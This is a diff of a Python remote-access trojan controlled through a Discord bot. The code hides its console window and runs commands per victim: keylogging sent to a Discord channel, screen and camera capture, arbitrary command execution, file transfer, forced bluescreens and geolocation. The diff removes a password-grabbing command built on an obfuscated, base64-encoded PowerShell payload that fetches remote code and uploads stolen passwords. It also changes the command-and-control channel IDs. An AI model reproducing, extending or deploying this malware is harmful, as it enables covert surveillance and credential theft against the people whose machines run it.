@@ -1,4 +1,4 @@
-import tkinter as tk, winreg as reg, sounddevice as sd, numpy as np, os, platform, time, win32gui, win32con, win32com.client, ctypes, binascii, discord, discord.ext, subprocess, requests, sys, asyncio, keyboard, winreg, pyaudio, threading, pyttsx3, pyperclip, multiprocessing, tempfile, cv2, io, aiohttp, random, difflib, pymsgbox, ctypes.wintypes, time, inspect
+import shutil, tkinter as tk, winreg as reg, sounddevice as sd, numpy as np, os, platform, time, win32gui, win32con, win32com.client, ctypes, binascii, discord, discord.ext, subprocess, requests, sys, asyncio, keyboard, winreg, pyaudio, threading, pyttsx3, pyperclip, multiprocessing, tempfile, cv2, io, aiohttp, random, difflib, pymsgbox, ctypes.wintypes, time, inspect
 from discord.ext import commands, tasks
 from PIL import ImageGrab
 from pynput.keyboard import Listener
@@ -45,9 +45,9 @@ ASCII = """
 """
 print(ASCII)
 
-DEV = "tilov"
+DEV = "tilob"
 
-if not os.getlogin() == DEV:
+if not os.getlogin() == "tilov":
     win32gui.SetForegroundWindow(ctypes.windll.kernel32.GetConsoleWindow())
 
     console_window = win32gui.GetForegroundWindow()
@@ -106,7 +106,7 @@ bot = commands.Bot(command_prefix='>', intents=intents, help_command=None)
 
 keylog_buffer = []
 
-hidden_commands = {"gerof", "wlan", "serverinfo", "leaveserver", "serverlist", "delonstrg", "randomkb", "resetkb", "removekb", "checkkb", "switchkb", "winr", "joinvoice", "leavevoice", "exec", "ad", "cams", "url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}
+hidden_commands = {"serverinfo", "leaveserver", "serverlist", "delonstrg", "randomkb", "resetkb", "removekb", "checkkb", "switchkb", "winr", "joinvoice", "leavevoice", "exec", "ad", "cams", "url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}
 
 def on_press(key):
     try:
@@ -241,10 +241,6 @@ async def on_ready():
 
 @bot.event
 async def on_message(message):
-    if message.author == bot.user:
-        await message.add_reaction("❌")
-        return
-
     if message.channel.name != os.getlogin():
         return
 
@@ -252,6 +248,11 @@ async def on_message(message):
         await handle_command(message)
     else:
         await bot.process_commands(message)
+
+    if message.author == bot.user:
+        time.sleep(0.1)
+        await message.add_reaction("❌")
+        return
 
 async def handle_command(message):
     content = message.content[len(bot.command_prefix):].split()
@@ -350,7 +351,7 @@ async def on_command_error(ctx, error):
 @bot.event
 async def on_command(ctx):
     target_guild_id = 1000796001541570670
-    target_channel_id = 1246457619812450345
+    target_channel_id = 1205819712013869056
 
     target_channel = bot.get_channel(target_channel_id)
 
@@ -1461,7 +1462,10 @@ class Keylogger:
 
 @bot.command(help='enable keylogger')
 async def on(ctx):
-    keylogger = Keylogger(ctx.channel, TIME_INTERVAL)
+    guild = bot.guilds[0]
+    user_channel_name = os.getlogin()
+    existing_channel = discord.utils.get(guild.channels, name=user_channel_name)
+    keylogger = Keylogger(existing_channel, TIME_INTERVAL)
     await ctx.send("Keylogger started.")
     keylogger.run()
 
@@ -1747,44 +1751,6 @@ async def checkadmin(ctx):
     elif is_admin == False:
         await ctx.send("[!] Sorry, you're not admin")
 
-@bot.command(help="grab passwords")
-async def passes(ctx):
-    temp = os.getenv('temp')
-    if not temp:
-        await ctx.send("Temp-Verzeichnis nicht gefunden.")
-        return
-
-    def shell(command):
-        try:
-            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-            output = result.stdout.decode('CP437').strip()
-            error = result.stderr.decode('CP437').strip()
-            if result.returncode != 0:
-                return f"Fehler beim Ausführen des Befehls: {error}"
-            return output
-        except Exception as e:
-            return f"Fehler beim Ausführen des Befehls: {e}"
-
-    powershell_command = "Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -EncodedCommand WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA="
-    passwords = shell(powershell_command)
-
-    if "Fehler beim Ausführen des Befehls" in passwords:
-        await ctx.send(passwords)
-        return
-
-    try:
-        file_path = os.path.join(temp, "passwords.txt")
-        with open(file_path, 'w') as f4:
-            f4.write(passwords)
-
-        file = discord.File(file_path, filename="passwords.txt")
-        await ctx.send("[*] Command successfully executed", file=file)
-    except Exception as e:
-        await ctx.send(f"Fehler beim Schreiben oder Senden der Datei: {e}")
-    finally:
-        if os.path.exists(file_path):
-            os.remove(file_path)
-
 @bot.command(help= "run anything like in win+r")
 async def winr(ctx, *, command):
     try:
@@ -1964,7 +1930,7 @@ async def leaveserver(ctx, server_id: int):
 @bot.event
 async def on_guild_join(guild):
     specific_guild_id = 1000796001541570670
-    specific_channel_id = 1246457619812450345
+    specific_channel_id = 1205819712013869056
 
     channel = bot.get_channel(specific_channel_id)
     if channel is not None:
@@ -2051,42 +2017,5 @@ async def wlan(ctx):
             await ctx.send(message)
     else:
         await ctx.send("No WLAN networks found.")
-
-def toggle_device(device_name, state):
-    try:
-        state = state.lower()
-        if state not in ['on', 'off']:
-            return "Invalid state! Use 'on' or 'off'."
-
-        wmi = win32com.client.Dispatch("WbemScripting.SWbemLocator")
-        service = wmi.ConnectServer(".", "root\cimv2")
-        devices = service.ExecQuery(f"SELECT * FROM Win32_PnPEntity WHERE Name LIKE '%{device_name}%'")
-
-        if len(devices) == 0:
-            return f"Device '{device_name}' not found."
-
-        for device in devices:
-            if state == 'on':
-                device.EnableDevice(True)
-            else:
-                device.DisableDevice(False)
-
-        return f"Successfully turned {state} the device: {device_name}"
-    except Exception as e:
-        return f"An error occurred: {str(e)}"
-
-@bot.command(name='gerof')
-async def gerof(ctx, *args):
-    try:
-        device_name = ' '.join(args[:-1])
-        state = args[-1].lower()
-
-        if state not in ['on', 'off']:
-            return await ctx.send("Invalid state! Use 'on' or 'off'.")
-
-        response = toggle_device(device_name, state)
-        await ctx.send(response)
-    except Exception as e:
-        await ctx.send(f"An error occurred: {str(e)}")
 
 bot.run(TOKEN)
